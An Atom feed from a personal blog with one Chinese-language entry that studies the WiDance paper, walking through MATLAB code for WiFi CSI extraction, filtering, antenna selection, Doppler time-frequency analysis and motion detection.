<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>一人Code</title>
  <subtitle>写给自己的Blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://xinqiu.me/"/>
  <updated>2018-06-16T02:36:12.000Z</updated>
  <id>http://xinqiu.me/</id>
  
  <author>
    <name>Xin Qiu</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>WiDance论文学习</title>
    <link href="http://xinqiu.me/2018/04/20/widance/"/>
    <id>http://xinqiu.me/2018/04/20/widance/</id>
    <published>2018-04-20T08:59:41.000Z</published>
    <updated>2018-06-16T02:36:12.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>毕设自己挖坑选择了以前科研的方向，所以继续开始看CSI。这次也是去复现清华的钱堃大佬论文，不同于之前的PADS，WiDance这篇论文要难上好几个数量级。</p>
</blockquote>
<h2 id="u7B80_u4ECB"><a href="#u7B80_u4ECB" class="headerlink" title="简介"></a>简介</h2><p>这里我也就不细细介绍分析论文每一段都写了什么，我主要是想以我的理解，以及部分源码的思路来重新看这一篇论文。论文里的 Figure 4 算是前期操作的一个主要过程了，这部分都是为了选取出合适的数据并提取出多普勒频移。Figure 6 则是利用多普勒频移进行建模，从而做到动作识别。整个论文的实现可以分为上述说到的这两大部分。本文的数据格式以及环境设置和论文里相同。</p>
<h2 id="u6570_u636E_u63D0_u53D6"><a href="#u6570_u636E_u63D0_u53D6" class="headerlink" title="数据提取"></a>数据提取</h2><p>按照论文里的设置，采样率是1024Hz，使用 <code>csi_get_all</code> 函数从原始的CSI中提取出振幅和时间戳进行后期工作。以前认为CSI就是用 <code>read_bf_file</code> 读取到的CSI矩阵，但实际上需要用 <code>get_scaled_csi</code> 处理一下。PADS中相位变换就需要这一步操作，没有这一步操作，会有一定的区别。</p>
<pre class=" language-matlab"><code class="language-matlab"><span class="token keyword">function</span> <span class="token punctuation">[</span>cfr_array<span class="token punctuation">,</span> timestamp<span class="token punctuation">,</span> rssi_array<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">csi_get_all</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
csi_trace <span class="token operator">=</span> <span class="token function">read_bf_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>
timestamp <span class="token operator">=</span> <span class="token function">zeros</span><span class="token punctuation">(</span><span class="token function">length</span><span class="token punctuation">(</span>csi_trace<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
cfr_array <span class="token operator">=</span> <span class="token function">zeros</span><span class="token punctuation">(</span><span class="token function">length</span><span class="token punctuation">(</span>csi_trace<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
rssi_array <span class="token operator">=</span> <span class="token function">zeros</span><span class="token punctuation">(</span><span class="token function">length</span><span class="token punctuation">(</span>csi_trace<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> k <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span><span class="token function">length</span><span class="token punctuation">(</span>csi_trace<span class="token punctuation">)</span>
    csi_entry <span class="token operator">=</span> csi_trace<span class="token punctuation">{</span>k<span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">% for the k_{th} packet</span>

    csi_all <span class="token operator">=</span> <span class="token function">squeeze</span><span class="token punctuation">(</span><span class="token function">get_scaled_csi</span><span class="token punctuation">(</span>csi_entry<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">% estimate channel matrix Hexp-figu</span>
    csi <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token function">csi_all</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">csi_all</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">csi_all</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">% select CSI for one antenna pair</span>

    <span class="token function">timestamp</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token operator">=</span> csi_entry<span class="token punctuation">.</span>timestamp_low<span class="token punctuation">;</span>
    <span class="token function">cfr_array</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span> <span class="token operator">=</span> csi<span class="token punctuation">;</span>
    <span class="token function">rssi_array</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">[</span>csi_entry<span class="token punctuation">.</span>rssi_a<span class="token punctuation">,</span> csi_entry<span class="token punctuation">.</span>rssi_b<span class="token punctuation">,</span> csi_entry<span class="token punctuation">.</span>rssi_c<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">end</span>
</code></pre>
<h2 id="u8BBE_u7F6E_u6EE4_u6CE2_u5668"><a href="#u8BBE_u7F6E_u6EE4_u6CE2_u5668" class="headerlink" title="设置滤波器"></a>设置滤波器</h2><p>论文里虽然首先进行天线选择，但实际上先完成的是Butterworth滤波器的构造。滤波是为了将高频和低频的信号过滤掉。</p>
<pre class=" language-matlab"><code class="language-matlab">half_rate <span class="token operator">=</span> samp_rate <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
uppe_orde <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>
uppe_stop <span class="token operator">=</span> <span class="token number">40</span><span class="token punctuation">;</span>
lowe_orde <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
lowe_stop <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
<span class="token punctuation">[</span>lu<span class="token punctuation">,</span>ld<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">butter</span><span class="token punctuation">(</span>uppe_orde<span class="token punctuation">,</span>uppe_stop<span class="token operator">/</span>half_rate<span class="token punctuation">,</span><span class="token string">'low'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">[</span>hu<span class="token punctuation">,</span>hd<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">butter</span><span class="token punctuation">(</span>lowe_orde<span class="token punctuation">,</span>lowe_stop<span class="token operator">/</span>half_rate<span class="token punctuation">,</span><span class="token string">'high'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
data_wind <span class="token operator">=</span> samp_rate <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span>
iter_star <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span>samp_rate<span class="token operator">:</span>n_data<span class="token operator">-</span>data_wind<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>
freq_bins <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">:</span>samp_rate<span class="token operator">/</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">-</span>samp_rate<span class="token operator">/</span><span class="token number">2</span><span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">'</span><span class="token operator">/</span>samp_rate<span class="token punctuation">;</span>
time_bins <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">length</span><span class="token punctuation">(</span>iter_star<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0.5</span><span class="token operator">*</span>data_wind<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> samp_rate<span class="token punctuation">;</span>
freq_sele <span class="token operator">=</span> freq_bins <span class="token operator">&lt;=</span> uppe_stop <span class="token operator">/</span> samp_rate <span class="token operator">&amp;</span> freq_bins <span class="token operator">>=</span> <span class="token operator">-</span>uppe_stop <span class="token operator">/</span> samp_rate<span class="token punctuation">;</span>
freq_bins <span class="token operator">=</span> <span class="token function">freq_bins</span><span class="token punctuation">(</span>freq_sele<span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
freq_time_prof <span class="token operator">=</span> <span class="token function">zeros</span><span class="token punctuation">(</span><span class="token function">length</span><span class="token punctuation">(</span>freq_bins<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">length</span><span class="token punctuation">(</span>time_bins<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">length</span><span class="token punctuation">(</span>file_path_list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>关于滤波器的设置，这里面的tricks就非常多了。首先是定义了一个数据窗口(采样率的两倍)，接着就是定义了频域选择器，之后定义的 <code>freq_time_prof</code> 用于后面时频分析。<code>iter_star</code> 是迭代生成器，按照此预设的迭代生成器从原始数据中选取部分数据来进行操作。</p>
<h2 id="u5929_u7EBF_u9009_u62E9"><a href="#u5929_u7EBF_u9009_u62E9" class="headerlink" title="天线选择"></a>天线选择</h2><p>在天线选择之前，先计算出信道能量，这里信道能量就是CSI的共轭乘积。</p>
<pre class=" language-matlab"><code class="language-matlab">chan_data <span class="token operator">=</span> chan_data_list<span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
chan_powe <span class="token operator">=</span> chan_data <span class="token operator">.*</span> <span class="token function">conj</span><span class="token punctuation">(</span>chan_data<span class="token punctuation">)</span><span class="token punctuation">;</span>
ante_pairs <span class="token operator">=</span> <span class="token function">zeros</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token function">length</span><span class="token punctuation">(</span>iter_star<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>之后按照论文的思路，选取出振幅最大方差最小和振幅最小方差最大的两个天线。这两根天线的数据进行计算共轭乘积。仔细想一下会发现这个地方非常的巧妙，一个动作的完整过程就是执行动作以及复原，会发现动作方向是一个相反方向，也就是说，多普勒频移应该是相反数的存在关系，通过共轭乘积，可以将这个动作看做成向同一个方向进行了一个更大的动作，这样将微弱的多普勒频移进行放大，这样在频谱图上，多普勒效应就会更加明显。</p>
<pre class=" language-matlab"><code class="language-matlab"><span class="token comment" spellcheck="true">%% Select antenna pair.</span>
                part_data <span class="token operator">=</span> <span class="token function">chan_data</span><span class="token punctuation">(</span><span class="token function">iter_star</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">iter_star</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span><span class="token operator">+</span>data_wind<span class="token number">-1</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                part_powe <span class="token operator">=</span> <span class="token function">chan_powe</span><span class="token punctuation">(</span><span class="token function">iter_star</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">iter_star</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span><span class="token operator">+</span>data_wind<span class="token number">-1</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                part_vari <span class="token operator">=</span> <span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token function">var</span><span class="token punctuation">(</span>part_powe<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                part_mean <span class="token operator">=</span> <span class="token function">mean</span><span class="token punctuation">(</span>part_powe<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                part_vari_ante <span class="token operator">=</span> <span class="token function">mean</span><span class="token punctuation">(</span><span class="token function">reshape</span><span class="token punctuation">(</span>part_vari<span class="token operator">.'</span><span class="token punctuation">,</span> n_subc<span class="token punctuation">,</span> n_ante<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                part_mean_ante <span class="token operator">=</span> <span class="token function">mean</span><span class="token punctuation">(</span><span class="token function">reshape</span><span class="token punctuation">(</span>part_mean<span class="token operator">.'</span><span class="token punctuation">,</span> n_subc<span class="token punctuation">,</span> n_ante<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                part_indi_ante <span class="token operator">=</span> part_mean_ante <span class="token operator">./</span> part_vari_ante<span class="token punctuation">;</span>
                <span class="token punctuation">[</span><span class="token operator">~</span><span class="token punctuation">,</span> maxi<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>part_indi_ante<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">[</span><span class="token operator">~</span><span class="token punctuation">,</span> mini<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>part_indi_ante<span class="token punctuation">)</span><span class="token punctuation">;</span>
                ante_pair <span class="token operator">=</span> <span class="token punctuation">[</span>mini<span class="token punctuation">,</span> maxi<span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token function">ante_pairs</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span>ii<span class="token punctuation">)</span> <span class="token operator">=</span> ante_pair<span class="token operator">.'</span><span class="token punctuation">;</span>
                part_diff <span class="token operator">=</span> <span class="token function">part_data</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">ante_pair</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>n_subc<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">ante_pair</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>n_subc<span class="token punctuation">)</span> <span class="token punctuation">...</span>
                    <span class="token operator">.*</span> <span class="token function">conj</span><span class="token punctuation">(</span><span class="token function">part_data</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">ante_pair</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>n_subc<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">ante_pair</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">*</span>n_subc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<h2 id="u6EE4_u6CE2_u4EE5_u53CA_u65F6_u9891_u5206_u6790"><a href="#u6EE4_u6CE2_u4EE5_u53CA_u65F6_u9891_u5206_u6790" class="headerlink" title="滤波以及时频分析"></a>滤波以及时频分析</h2><p>在选择完天线以后才会用之前定义好的滤波器进行滤波，接着用PCA进行数据压缩，之后用 <code>tftb</code> 时频分析工具箱进行时频分析。</p>
<pre class=" language-matlab"><code class="language-matlab"><span class="token comment" spellcheck="true">%% Filter out noises and interferences.</span>
                <span class="token keyword">for</span> jj <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span>n_subc<span class="token punctuation">,</span>
                    <span class="token function">part_diff</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span>jj<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span>lu<span class="token punctuation">,</span> ld<span class="token punctuation">,</span> <span class="token function">part_diff</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span>jj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token function">part_diff</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span>jj<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span>hu<span class="token punctuation">,</span> hd<span class="token punctuation">,</span> <span class="token function">part_diff</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span>jj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">end</span>

                pca_coef <span class="token operator">=</span> <span class="token function">pca</span><span class="token punctuation">(</span>part_diff<span class="token punctuation">)</span><span class="token punctuation">;</span>
                part_diff <span class="token operator">=</span> part_diff <span class="token operator">*</span> <span class="token function">pca_coef</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                part_wind <span class="token operator">=</span> <span class="token function">floor</span><span class="token punctuation">(</span><span class="token number">0.5</span><span class="token operator">*</span>samp_rate<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">1.5</span><span class="token operator">*</span>samp_rate<span class="token punctuation">)</span><span class="token punctuation">;</span>
                part_spec <span class="token operator">=</span> <span class="token function">tfrsp</span><span class="token punctuation">(</span>part_diff<span class="token punctuation">,</span> part_wind<span class="token punctuation">,</span> samp_rate<span class="token punctuation">,</span> <span class="token function">tftb_window</span><span class="token punctuation">(</span>samp_rate<span class="token operator">/</span><span class="token number">8</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'gauss'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">freq_time_prof</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token punctuation">(</span>ii<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span>samp_rate<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span>ii<span class="token operator">*</span>samp_rate<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">part_spec</span><span class="token punctuation">(</span>freq_sele<span class="token punctuation">,</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>使用 <code>mesh(time_bins, freq_bins, freq_time_prof)</code> 可以画出频谱图。</p>
<h2 id="u52A8_u4F5C_u68C0_u6D4B"><a href="#u52A8_u4F5C_u68C0_u6D4B" class="headerlink" title="动作检测"></a>动作检测</h2><p>在动作检测事情，先通过 <code>smooth</code> 进行数据光滑操作。</p>
<pre class=" language-matlab"><code class="language-matlab">prof_cent <span class="token operator">=</span> <span class="token function">zeros</span><span class="token punctuation">(</span><span class="token function">length</span><span class="token punctuation">(</span>time_bins<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">length</span><span class="token punctuation">(</span>file_path_list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    prof_vari <span class="token operator">=</span> <span class="token function">zeros</span><span class="token punctuation">(</span><span class="token function">length</span><span class="token punctuation">(</span>time_bins<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">length</span><span class="token punctuation">(</span>file_path_list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    prof_ener <span class="token operator">=</span> <span class="token function">zeros</span><span class="token punctuation">(</span><span class="token function">length</span><span class="token punctuation">(</span>time_bins<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">length</span><span class="token punctuation">(</span>file_path_list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">%     powe_cent = zeros(length(time_bins),length(file_path_list));</span>
    norm_freq_time_prof <span class="token operator">=</span> <span class="token function">zeros</span><span class="token punctuation">(</span><span class="token function">size</span><span class="token punctuation">(</span>freq_time_prof<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">%     norm_powe_freq_time_prof = zeros(size(powe_freq_time_prof));</span>

    <span class="token keyword">for</span> kk <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span><span class="token function">length</span><span class="token punctuation">(</span>file_path_list<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token function">norm_freq_time_prof</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">freq_time_prof</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">./</span> <span class="token function">repmat</span><span class="token punctuation">(</span><span class="token function">sum</span><span class="token punctuation">(</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">freq_time_prof</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token function">freq_time_prof</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">%         norm_powe_freq_time_prof(:,:,kk) = abs(powe_freq_time_prof(:,:,kk)) ./ repmat(sum(abs(powe_freq_time_prof(:,:,kk)),1), size(powe_freq_time_prof(:,:,kk),1), 1);</span>
        <span class="token function">prof_cent</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span> <span class="token operator">=</span> freq_bins<span class="token operator">.'</span> <span class="token operator">*</span> <span class="token function">norm_freq_time_prof</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">%         powe_cent(:,kk) = powe_freq_bins.' * norm_powe_freq_time_prof(:,:,kk);</span>

        <span class="token function">prof_vari</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token function">sum</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">repmat</span><span class="token punctuation">(</span>freq_bins<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token function">length</span><span class="token punctuation">(</span>time_bins<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">repmat</span><span class="token punctuation">(</span><span class="token function">prof_cent</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span><span class="token operator">.'</span><span class="token punctuation">,</span> <span class="token function">length</span><span class="token punctuation">(</span>freq_bins<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.^</span><span class="token number">2</span> <span class="token punctuation">...</span>
            <span class="token operator">.*</span> <span class="token function">norm_freq_time_prof</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">prof_ener</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">smooth</span><span class="token punctuation">(</span><span class="token function">sum</span><span class="token punctuation">(</span><span class="token function">freq_time_prof</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> samp_rate<span class="token operator">/</span><span class="token number">8</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'moving'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">end</span>
</code></pre>
<p>动作检测里设定了阈值，正如论文所说的，一个动作在一对波峰或波谷之中。</p>
<pre class=" language-matlab"><code class="language-matlab"><span class="token comment" spellcheck="true">%% Motion Detection...</span>
    moti_indi <span class="token operator">=</span> <span class="token function">smooth</span><span class="token punctuation">(</span><span class="token function">mean</span><span class="token punctuation">(</span>prof_vari<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>samp_rate<span class="token operator">/</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'moving'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    dete_thre <span class="token operator">=</span> <span class="token number">0.015</span><span class="token punctuation">;</span>
    time_thre <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0.25</span><span class="token punctuation">,</span> <span class="token number">0.25</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    moti_valu <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    moti_inde <span class="token operator">=</span> moti_indi <span class="token operator">&lt;</span> dete_thre<span class="token punctuation">;</span>

    <span class="token keyword">for</span> jj <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span><span class="token function">length</span><span class="token punctuation">(</span>time_thre<span class="token punctuation">)</span><span class="token punctuation">,</span>
        curr_thre <span class="token operator">=</span> <span class="token function">time_thre</span><span class="token punctuation">(</span>jj<span class="token punctuation">)</span><span class="token punctuation">;</span>
        curr_valu <span class="token operator">=</span> <span class="token function">moti_valu</span><span class="token punctuation">(</span>jj<span class="token punctuation">)</span><span class="token punctuation">;</span>
        ii <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> ii <span class="token operator">&lt;=</span> <span class="token function">length</span><span class="token punctuation">(</span>moti_inde<span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">while</span> ii <span class="token operator">&lt;=</span> <span class="token function">length</span><span class="token punctuation">(</span>moti_inde<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">moti_inde</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span> <span class="token operator">~=</span> curr_valu<span class="token punctuation">,</span>
                ii <span class="token operator">=</span> ii <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">end</span>
            <span class="token keyword">if</span> ii <span class="token operator">></span> <span class="token function">length</span><span class="token punctuation">(</span>moti_inde<span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">end</span>
            kk <span class="token operator">=</span> ii <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span> kk <span class="token operator">&lt;=</span> <span class="token function">length</span><span class="token punctuation">(</span>moti_inde<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">moti_inde</span><span class="token punctuation">(</span>kk<span class="token punctuation">)</span> <span class="token operator">==</span> curr_valu<span class="token punctuation">,</span>
                kk <span class="token operator">=</span> kk <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">end</span>
            <span class="token keyword">if</span> kk <span class="token operator">-</span> ii <span class="token operator">&lt;</span> curr_thre <span class="token operator">*</span> samp_rate<span class="token punctuation">,</span>
                <span class="token function">moti_inde</span><span class="token punctuation">(</span>ii<span class="token operator">:</span>kk<span class="token number">-1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">~</span>curr_valu<span class="token punctuation">;</span>
            <span class="token keyword">end</span>
            ii <span class="token operator">=</span> kk<span class="token punctuation">;</span>
        <span class="token keyword">end</span>
    <span class="token keyword">end</span>
    moti_indx <span class="token operator">=</span> <span class="token function">find</span><span class="token punctuation">(</span>moti_inde<span class="token punctuation">)</span><span class="token punctuation">;</span>
    note_inte <span class="token operator">=</span> <span class="token function">floor</span><span class="token punctuation">(</span>note_inte <span class="token operator">*</span> samp_rate<span class="token punctuation">)</span><span class="token punctuation">;</span>
    note_indx <span class="token operator">=</span> <span class="token function">moti_indx</span><span class="token punctuation">(</span>ll<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">%note_indx = indx_list(ll);</span>
    note_end <span class="token operator">=</span> <span class="token function">moti_indx</span><span class="token punctuation">(</span><span class="token keyword">end</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    note_segm <span class="token operator">=</span> <span class="token function">zeros</span><span class="token punctuation">(</span>n_note<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
